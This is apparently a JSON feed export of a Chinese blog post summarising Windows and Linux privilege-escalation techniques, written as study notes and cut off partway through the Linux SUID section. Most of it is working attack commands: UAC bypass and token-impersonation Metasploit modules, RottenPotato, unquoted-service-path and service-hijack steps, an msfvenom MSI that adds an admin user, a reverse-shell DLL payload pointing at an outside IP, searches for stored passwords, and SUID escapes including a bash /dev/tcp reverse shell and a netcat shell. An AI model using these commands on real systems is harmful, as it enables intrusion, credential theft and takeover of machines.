{
    "version": "https://jsonfeed.org/version/1",
    "title": "Moyao の小屋 • All posts by \"pentesting\" tag",
    "description": "Write down something interesting I met<br />\nFeel free to mail me if you have something wanted to talk about, plz\nmail: &lt;moyaoxue@outlook.com&gt;\n",
    "home_page_url": "https://demoyao100.github.io",
    "items": [
        {
            "id": "https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/",
            "url": "https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/",
            "title": "渗透提权总结",
            "date_published": "2024-05-12T09:27:14.000Z",
            "content_html": "<p>PREFACE：这个是真不太会，赶紧学学…</p>\n<span id=\"more\"></span>\n<h2 id=\"一-windows\"><a class=\"markdownIt-Anchor\" href=\"#一-windows\">#</a> 一、windows</h2>\n<h3 id=\"1-windows权限分级\"><a class=\"markdownIt-Anchor\" href=\"#1-windows权限分级\">#</a> 1 windows 权限分级</h3>\n<p>1.user：普通用户权限，是系统中最安全的权限（因为分配给改组的默认权限不允许成员操作修改操作系统的设置或用户资料）</p>\n<p>2.Administrator： 管理员权限。可以利用 windows 的机制将自己提升为 system 权限，以便操作 SAm 文件</p>\n<p>3.System： 系统权限。可以对 sam 等敏感文件进行读取，往往需要将 administrator 权限提升到 system 权限才可以对散列值进行 DUmp 操作</p>\n<p>4.TrustedInstaller：window 中的最高权限，对系统文件，即将拥有 system 权限也无法进行获取散列值、安装软件、修改防火墙规则、修改注册表等</p>\n<h3 id=\"2-流程\"><a class=\"markdownIt-Anchor\" href=\"#2-流程\">#</a> 2 流程</h3>\n<p>检查用户</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>whoami/groups</pre></td></tr></table></figure><p>查看目标机器补丁</p>\n<pre><code>systeminfo\nwmic qfe get Caption,Description ,HotFixID,InstalledOn\n</code></pre>\n<p>msf 渗透扫描</p>\n<pre><code>post/windows/gather/enum_patches\n</code></pre>\n<h3 id=\"3-at命令利用-windows2000-windows-2003-windows-xp\"><a class=\"markdownIt-Anchor\" href=\"#3-at命令利用-windows2000-windows-2003-windows-xp\">#</a> 3 at 命令利用 Windows2000、Windows 2003、Windows XP</h3>\n<p>​\t\t在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用 at 命令将权限提升至 system 权限。</p>\n<p>AT 命令是 Windows XP 中内置的命令，它也可以媲美 Windows 中的 &quot;计划任务&quot;，而且在计划的安排、任务的管理、工作事务的处理方面，AT 命令具有更强大更神通的功能。AT 命令可在指定时间和日期、在指定计算机上运行命令和程序。</p>\n<p>因为 at 命令默认是以 system 权限下运行的所以我们可以利用以下命令，进行提权。</p>\n<p>at 时间 /interactive cmd 其中里面的 /interactive 参数是开启交互模式</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165344444-1263387316.png\" alt=\"img\"></p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165345724-1823083219.png\" alt=\"img\"></p>\n<p>可以看到已经启动了一个 system 权限下的 cmd 窗口，虽然此时我们已经有了 system 的权限，但是可以看到，桌面还是之前用户的权限所启动的<img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346188-456697944.png\" alt=\"img\"></p>\n<p>为了完全提权，我们可以在 system 的 cmd 里面输入 taskmgr.exe 来启动任务管理器</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346621-908976883.png\" alt=\"img\"></p>\n<p>在任务管理器里面我们结束掉之前由之前账号开启的桌面进程</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347188-2031860445.png\" alt=\"img\"></p>\n<p>然后再添加一个由 system 权限下开启的桌面进程</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347529-1439309872.png\" alt=\"img\"></p>\n<p>再点入看现在登入的账号是</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348118-1951026428.png\" alt=\"img\"></p>\n<p>或者利用 msf 生成木马在利用 at 启动</p>\n<h3 id=\"4-sc命令利用-windows-78-0308-1216\"><a class=\"markdownIt-Anchor\" href=\"#4-sc命令利用-windows-78-0308-1216\">#</a> 4 sc 命令利用 windows 7/8、03/08、12/16</h3>\n<p>适用于 windows 7/8、03/08、12/16</p>\n<p>因为 at 命令在 win7，win8 等更高版本的系统上都已经取消掉了，所以在一些更高版本的 windows 操作系统上我们可以用 sc 命令进行提权</p>\n<p>SC 命令是 XP 系统中功能强大的 DOS 命令，SC 命令能与 &quot;服务控制器&quot; 和已安装设备进行通讯。SC 是用于与服务控制管理器和服务进行通信的命令行程序。</p>\n<p>通俗理解就是 sc 可以启动一个服务，命令如下。</p>\n<pre><code>sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact\n</code></pre>\n<p>其中 systemcmd 是服务名称，大家可以随意填写，binpath 是启动的命令，type=own 是指服务这个服务属于谁，type=interact。这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的 cmd 窗口，如图。</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348548-2040451659.png\" alt=\"img\"></p>\n<p>我们继续回车</p>\n<p>上面的命令。</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348917-255228848.png\" alt=\"img\"></p>\n<pre><code>sc start systemcmd\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349331-1015014567.png\" alt=\"img\"></p>\n<p>因为 sc 启动服务也是默认 system 权限的，所以我们启动的 cmd 窗口也是 system 权限！接下来的操作就可以和 xp，2003 一样了，这里就不在重复了。</p>\n<h3 id=\"5-psexec提权-win2003-win2008\"><a class=\"markdownIt-Anchor\" href=\"#5-psexec提权-win2003-win2008\">#</a> 5 psexec 提权 Win2003、Win2008</h3>\n<p>适用版本：Win2003 &amp; Win2008</p>\n<pre><code>psexec.exe -accepteula -s -i -d cmd.exe\n</code></pre>\n<p>开启的 cmd 窗口也是 system 权限</p>\n<h3 id=\"6-绕过uac提权-microsoft的windows-vista-windows-server-2008\"><a class=\"markdownIt-Anchor\" href=\"#6-绕过uac提权-microsoft的windows-vista-windows-server-2008\">#</a> 6 绕过 UAC 提权 Microsoft 的 Windows Vista、Windows Server 2008</h3>\n<h5 id=\"1简介\"><a class=\"markdownIt-Anchor\" href=\"#1简介\">#</a> （1）简介</h5>\n<p>​\t\tMicrosoft 的 Windows Vista 和 Windows Server 2008 操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。</p>\n<p>​\t\t换句话说，它是 Windows 的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC 确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且 Windows 系统保持不变。</p>\n<p>​\t\tUAC 通过阻止程序执行任何涉及有关系统更改 / 特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被 &quot;提升权限&quot;，而不是以管理员身份运行的程序。</p>\n<p>​\t\tUAC 不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。</p>\n<h5 id=\"2绕过方法\"><a class=\"markdownIt-Anchor\" href=\"#2绕过方法\">#</a> （2）绕过方法</h5>\n<p>通过 msf 拿到 meterprter 的会话后，我们可以通过 getsystem 或者 getuid 来检查是否是 system 权限</p>\n<p>如果不是 system 权限，我们可以通过以下绕过 UAC 模块对 UAC 进行绕过，在通过 getsystem 进行提权</p>\n<pre><code>exploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限\nexploit/windows/local/bypassuac\nexploit/windows/local/bypassuac_injection\nexploit/windows/local/bypassuac_fodhelper\nexploit/windows/local/bypassuac_eventvwr\nexploit/windows/local/bypassuac_comhijack\n</code></pre>\n<h3 id=\"7-令牌窃取-2008及以前\"><a class=\"markdownIt-Anchor\" href=\"#7-令牌窃取-2008及以前\">#</a> 7 令牌窃取 2008 及以前</h3>\n<h5 id=\"令牌简介\"><a class=\"markdownIt-Anchor\" href=\"#令牌简介\">#</a> 令牌简介</h5>\n<p>​\t\t描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个 Access Token，这个 Token 在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了 A 用户创建一个进程而该进程没有 B 用户的权限。一般用户双击运行一个进程都会拷贝 explorer.exe 的 Access Token。访问令牌分为：</p>\n<ul>\n<li>\n<p>授权令牌（Delegation token）：交互式会话登陆（例：本地用户登陆、用户桌面等）</p>\n</li>\n<li>\n<p>模拟令牌（Impersonation token）：非交互式登陆（例：net use 访问共享文件）</p>\n</li>\n</ul>\n<p>两种 token 只有在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。</p>\n<p>​\t\t同样也可以这样理解，当前系统中的某个进程或线程能访问到什么样的系统资源，完全取决于你当前进程是拿着谁的令牌。</p>\n<p>​\t\t默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前 shell 的访问级别，如果当前的 shell 是 administrator 或者是 system，我们就可以看到系统中的所有的令牌。</p>\n<h5 id=\"攻击方法\"><a class=\"markdownIt-Anchor\" href=\"#攻击方法\">#</a> 攻击方法</h5>\n<p>首先提前获取一个 session</p>\n<pre><code>meterpreter &gt; use incognito\n\nmeterpreter &gt; list_tokens -u\n\nmeterpreter &gt; impersonate_token WIN-2HU3N1\\\\Administrator **#注意：这里是两个反斜杠\\\\**\n</code></pre>\n<h3 id=\"8-烂土豆提权-web权限\"><a class=\"markdownIt-Anchor\" href=\"#8-烂土豆提权-web权限\">#</a> 8 烂土豆提权 web 权限</h3>\n<h4 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h4>\n<ul>\n<li>欺骗 &quot;NT AUTHORITY\\SYSTEM&quot; 账户通过 NTLM 认证到我们控制的 TCP 终端。</li>\n<li>对这个认证过程使用中间人攻击（NTLM 重放），为 &quot;NT AUTHORITY\\SYSTEM&quot; 账户本地协商一个安全令牌。这个过程是通过一系列的 Windows API 调用实现的。</li>\n<li>模仿这个令牌。只有具有 &quot;模仿安全令牌权限&quot; 的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL 等）有这个权限，大多数用户级的账户没有这个权限。</li>\n</ul>\n<p>​\t\t所以，一般从 web 拿到的 webshell 都是 IIS 服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹 meterpreter 然后再去执行 EXP 的时候会失败，但使用菜刀（IIS 服务器权限）反弹 meterpreter 就会成功。</p>\n<h4 id=\"攻击方法-2\"><a class=\"markdownIt-Anchor\" href=\"#攻击方法-2\">#</a> 攻击方法</h4>\n<pre><code>meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exe\n\nmeterpreter &gt; execute -HC -f rottenpotato.exe\n\nmeterpreter &gt; use incognito\n\nmeterpreter &gt; list_tokens -u\n</code></pre>\n<p>会发现令牌列表里面存在 system 的令牌，在用 system 的令牌进行提权</p>\n<p><strong>烂土豆版本</strong></p>\n<ol>\n<li><a href=\"https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe\">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li>\n<li><a href=\"https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe\">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li>\n<li><a href=\"https://github.com/foxglovesec/RottenPotato\">https://github.com/foxglovesec/RottenPotato</a></li>\n</ol>\n<h3 id=\"9-可信任服务路径漏洞\"><a class=\"markdownIt-Anchor\" href=\"#9-可信任服务路径漏洞\">#</a> 9 可信任服务路径漏洞</h3>\n<p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</p>\n<p><strong>漏洞原理</strong></p>\n<p>这里假设有一个服务路径 C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe</p>\n<ol>\n<li>带引号时：&quot;C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe&quot; 会被看成一个完整的服务路径，故不会产生漏洞。</li>\n<li>不带引号时：我们认为的服务路径是 C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe，但是由于没有双引号的包裹，Windows 会认为 C:\\Program 空格后面的为 Program 这个程序的参数来进行启动服务。这样攻击者就可以命名一个为 Program.exe 的后门文件放在 c 盘下，进而等待含漏洞服务路径的启动或重启导致后门文件的执行。</li>\n</ol>\n<p><strong>攻击方法</strong></p>\n<p>#寻找存在漏洞的服务</p>\n<pre><code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\\Windows\\\\&quot; | findstr /i /v &quot;&quot;&quot;\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png\" alt=\"img\"></p>\n<p>把我们后门文件重命名放在对应的文件路径下</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png\" alt=\"img\"></p>\n<p>在 msf 上进行监听，然后启动对应服务</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png\" alt=\"img\"></p>\n<p>接收到 shell，且是 system 权限</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png\" alt=\"img\"></p>\n<p>msf 检测攻击模块</p>\n<pre><code>exploit/windows/local/unquoted_service_path\n</code></pre>\n<p>正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程</p>\n<pre><code>set AutoRunScript migrate -f\n</code></pre>\n<h3 id=\"10-不安全服务权限配合计划任务schtasks或sc命令利用\"><a class=\"markdownIt-Anchor\" href=\"#10-不安全服务权限配合计划任务schtasks或sc命令利用\">#</a> 10 不安全服务权限配合计划任务 schtasks 或 SC 命令利用</h3>\n<p>​\t\t如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用覆盖原来的服务路径，进而启动我们的恶意程序。（一般用来 administrator 提权到 system，因为普通用户用 sc 修改服务路径会没有权限，导致不能用该方法提权。）</p>\n<p>accesschk.exe -uwcqv “administrators” * #检查 administrators 组的权限配置（这里自己创建了一个 test 服务）</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png\" alt=\"img\"></p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png\" alt=\"img\"></p>\n<p>sc config “test” binpath=“C:\\shell.exe” #用 sc 命令修改服务对应路径</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png\" alt=\"img\"></p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png\" alt=\"img\"></p>\n<p>sc start test #然后我们在 msf 监听，在启动该服务，就可以接收到我们的 shell</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png\" alt=\"img\"></p>\n<p>当然还可以用 schtasks 来定时启动服务，schtasks 命令比 at 命令更灵活。而且在 Windows Vista、Windows Server 2008 及之后版本的操作系统已经弃用 at 命令。</p>\n<p>#查看计算机的计划任务</p>\n<pre><code>schtasks /query /fo LIST /v\nschtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\\artifact.exe /ru system /f\n</code></pre>\n<p>在远程主机运行 &quot;test&quot; 任务</p>\n<pre><code>schtasks /run /s 10.10.10.80 /i /tn &quot;test&quot;\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png\" alt=\"img\"></p>\n<p>执行完成之后就删除计划任务</p>\n<pre><code>schtasks /delete /s 10.10.10.80 /tn &quot;test&quot; /f\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png\" alt=\"img\"></p>\n<p>接着删除 IPC</p>\n<pre><code>net use \\\\10.10.10.80 /del /y\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png\" alt=\"img\"></p>\n<p>在使用 schtasks 命令的时候会在系统留下日志文件 C:WindowsTasksSchedLgU.txt。</p>\n<p><strong>参数：</strong></p>\n<pre><code>/create 表示创建计划任务\n\n/tn 表示任务名\n\n/tr 指定运行的文件\n\n/sc 是任务运行频率\n\n/st 是执行时间\n\n/s 指定远程机器名或 ip 地址\n\n/ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM\n\n/i 表示立即运行\n\n/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告\n\n/delete 是删除任务。\n</code></pre>\n<h3 id=\"10-unattended-installs自动安装\"><a class=\"markdownIt-Anchor\" href=\"#10-unattended-installs自动安装\">#</a> 10 Unattended Installs（自动安装）</h3>\n<p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为 Unattend 的 XML 文件残存在系统上。 这个 XML 文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>\n<p>全盘搜索 Unattend 文件是个好办法，它通常会在以下一个文件夹中：</p>\n<p>Copy</p>\n<p>C:\\Windows\\Panther<br>\nC:\\Windows\\Panther\\Unattend<br>\nC:\\Windows\\System32<br>\nC:\\Windows\\System32\\sysprep\\</p>\n<p>除了 Unattend.xml 文件外，还要留意系统中的 sysprep.xml 和 sysprep.inf 文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p>\n<p>Copy</p>\n<p>C:\\Users\\user\\Desktop&gt; dir C:*vnc.ini /s /b /c</p>\n<p>Copy</p>\n<p>#或者在名称中包含关键词的项目：<br>\nC:\\Users\\user\\Desktop&gt; dir C:\\ /s /b /c | findstr /sr <em>password</em></p>\n<p>#或者可以在文件内容中搜索 password 之类的关键字：<br>\nC:\\Users\\user\\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</p>\n<p>#可以查询注册表，例如，字符串 password：<br>\nreg query HKLM /f password /t REG_SZ /s<br>\nreg query HKCU /f password /t REG_SZ /s</p>\n<p>在这些文件中通常包含用户名和密码，密码使用 base64 编码，并且在最后会附加 &quot;Password&quot;，所以真正的密 码需要去掉最后的 &quot;Password&quot;。</p>\n<p>#msf 模块<br>\n post/windows/gather/enum_unattend</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200417102207151-1260539331.png\"><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png\" alt=\"img\"></a></p>\n<h3 id=\"11-alwaysinstallelevated\"><a class=\"markdownIt-Anchor\" href=\"#11-alwaysinstallelevated\">#</a> 11 AlwaysInstallElevated</h3>\n<p>AlwaysInstallElevated 是一种允许非管理用户以 SYSTEM 权限运行 Microsoft Windows 安装程序包（.MSI 文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。</p>\n<p>可以通过查询以下注册表项来识别此设置：</p>\n<pre><code>[HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001\n</code></pre>\n<p>使用 reg query 命令查询是否存在漏洞</p>\n<pre><code>C:&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nor\nC:&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre>\n<p>如果系统没这个漏洞，它将输出错误:</p>\n<pre><code>ERROR: The system was unable to find the specified registry key or value.\n</code></pre>\n<p>如果存在漏洞，上面将输出以下内容:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200417101457457-373225001.png\"><img src=\"https://img2020.cnblogs.com/blog/2096968/202108/2096968-20210819165354233-1421529420.png\" alt=\"img\"></a></p>\n<p>然后我们使用 msfvenom 生成 msi 文件，进行提权</p>\n<pre><code>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi\n\nmsiexec /quiet /qn /i C:\\programdata\\rotten.msi\n</code></pre>\n<p># /quiet 安装过程中禁止向用户发送消息<br>\n# /qn 不使用 GUI<br>\n# /i 安装程序</p>\n<p>msf 下的自动模块</p>\n<pre><code>exploit/windows/local/always_install_elevated\n</code></pre>\n<h3 id=\"12-dll劫持提权\"><a class=\"markdownIt-Anchor\" href=\"#12-dll劫持提权\">#</a> 12 DLL 劫持提权</h3>\n<h4 id=\"原理-2\"><a class=\"markdownIt-Anchor\" href=\"#原理-2\">#</a> 原理</h4>\n<p>Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：</p>\n<p>1、应用程序加载的目录</p>\n<p>2、C:\\Windows\\System32</p>\n<p>3、C:\\Windows\\System</p>\n<p>4、C:\\Windows</p>\n<p>5、当前工作目录 Current Working Directory，CWD</p>\n<p>6、在 PATH 环境变量的目录（先系统后用户）</p>\n<p>过程：信息收集 - 进程调试 - 制作 dll 并上传 - 替换 dll - 启动应用后成功</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/test.dll</p>\n<h3 id=\"13-常用系统漏洞-cve-windows10-windows72008-windows78-200820122016-sql-server-iis通杀-针对本地用户的不能用于域用户\"><a class=\"markdownIt-Anchor\" href=\"#13-常用系统漏洞-cve-windows10-windows72008-windows78-200820122016-sql-server-iis通杀-针对本地用户的不能用于域用户\">#</a> 13 常用系统漏洞 CVE Windows10 Windows7/2008 Windows7/8、2008/2012/2016 SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)</h3>\n<h5 id=\"windows10\"><a class=\"markdownIt-Anchor\" href=\"#windows10\">#</a> Windows10</h5>\n<p>CVE-2020-0796 <a href=\"https://www.cnblogs.com/-chenxs/p/12618678.html\">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p>\n<h5 id=\"windows72008\"><a class=\"markdownIt-Anchor\" href=\"#windows72008\">#</a> Windows7/2008</h5>\n<p>CVE-2018-8120 <a href=\"https://www.cnblogs.com/-mo-/p/11404598.html\">https://www.cnblogs.com/-mo-/p/11404598.html</a></p>\n<h5 id=\"windows78-200820122016\"><a class=\"markdownIt-Anchor\" href=\"#windows78-200820122016\">#</a> Windows7/8、2008/2012/2016</h5>\n<p>CVE-2017-0213 <a href=\"https://www.cnblogs.com/-mo-/p/11446144.html\">https://www.cnblogs.com/-mo-/p/11446144.html</a></p>\n<h5 id=\"sql-server-iis通杀-针对本地用户的不能用于域用户\"><a class=\"markdownIt-Anchor\" href=\"#sql-server-iis通杀-针对本地用户的不能用于域用户\">#</a> SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)</h5>\n<p>MS16-075(RottenPotato) <a href=\"https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075\">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p>\n<h2 id=\"二-linux\"><a class=\"markdownIt-Anchor\" href=\"#二-linux\">#</a> 二、linux</h2>\n<h3 id=\"1-suid提权\"><a class=\"markdownIt-Anchor\" href=\"#1-suid提权\">#</a> 1 suid 提权</h3>\n<p>程序 <code>ls -l</code>  如果有个 s 位，即有 suid</p>\n<p>Ubuntu 16.04 以后，无法直接使用 SUID+ <code>system()</code>  的方式来提权，Ubuntu 发行版官方对 dash 进行了修改：<strong>当 dash 以 suid 权限运行、且没有指定 <code>-p</code>  选项时，将会丢弃 suid 权限，恢复当前用户权限</strong></p>\n<h4 id=\"1-找到有root权限的程序\"><a class=\"markdownIt-Anchor\" href=\"#1-找到有root权限的程序\">#</a> （1） 找到有 root 权限的程序</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-user</span> root <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-4000</span> <span class=\"token parameter variable\">-print</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token parameter variable\">-type</span> f <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-user</span> root <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-4000</span> <span class=\"token parameter variable\">-exec</span> <span class=\"token function\">ls</span> <span class=\"token parameter variable\">-ldb</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"2可用于suid提权的程序\"><a class=\"markdownIt-Anchor\" href=\"#2可用于suid提权的程序\">#</a> （2）可用于 suid 提权的程序</h4>\n<h5 id=\"1-nmap\"><a class=\"markdownIt-Anchor\" href=\"#1-nmap\">#</a> ① nmap</h5>\n<ul>\n<li>较旧版本的 Nmap（2.02 至 5.21）具有交互模式</li>\n</ul>\n<p>进入交互模式：</p>\n<pre><code>nmap --interactive\n</code></pre>\n<p>提权：</p>\n<pre><code>nmap&gt; !sh\nsh-3.2# whoami\nroot\n</code></pre>\n<p>msf 中的可提权模块：</p>\n<pre><code>exploit/unix/local/setuid_nmap\n</code></pre>\n<h5 id=\"2-find\"><a class=\"markdownIt-Anchor\" href=\"#2-find\">#</a> ② find</h5>\n<p>提权：</p>\n<pre><code>touch anyfile #必须要有这个文件\nfind anyfile -exec whoami \\;\n</code></pre>\n<p>进入交互：</p>\n<pre><code>#进入shell\nfind anyfile -exec '/bin/sh' \\;\nsh-5.0# whoami\nroot\n</code></pre>\n<p>广播 shell（出网）：</p>\n<pre><code>find user -exec nc -lvp 4444 -e '/bin/sh' \\;\n</code></pre>\n<p>在攻击机：</p>\n<pre><code>nc 靶机ip 4444\n</code></pre>\n<p>反弹 shell：</p>\n<pre><code>find anyfile -exec bash -c 'bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1' \\;\n</code></pre>\n<p>在攻击机：</p>\n<pre><code>nc -lvvp 4444\n</code></pre>\n<h5 id=\"3-vim\"><a class=\"markdownIt-Anchor\" href=\"#3-vim\">#</a> ③ Vim</h5>\n<p>如果以 SUID 运行，它将继承 root 用户权限，可以读取系统上的所有文件</p>\n<pre><code>vim.tiny  /etc/passwd\n</code></pre>\n<p>通过 vim 进入 shell：</p>\n<pre><code>vim.tiny\n#vim命令\n:set shell = '/bin/sh'\n:shell\n</code></pre>\n<h5 id=\"4-bash\"><a class=\"markdownIt-Anchor\" href=\"#4-bash\">#</a> ④ Bash</h5>\n<p>用 root 打开一个 bash shell：</p>\n<pre><code>bash -p\nbash-3.2# id\nuid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)\n</code></pre>\n<h5 id=\"5-less\"><a class=\"markdownIt-Anchor\" href=\"#5-less\">#</a> ⑤ less</h5>\n<p>进入 shell：</p>\n<pre><code>less /etc/passwd\n#在less中输入:\n!/bin/sh\n</code></pre>\n<h5 id=\"6-more\"><a class=\"markdownIt-Anchor\" href=\"#6-more\">#</a> ⑥ more</h5>\n<p>进入 shell：</p>\n<pre><code>more /etc/passwd\n#在more中输入:\n!/bin/sh\n</code></pre>\n<p>要注意的是使用 more 和 less 一定读取一个比较大的文件，如果文件太小无法进入翻页功能也就无法使用 <code>!</code>  命令进入 shell</p>\n<h5 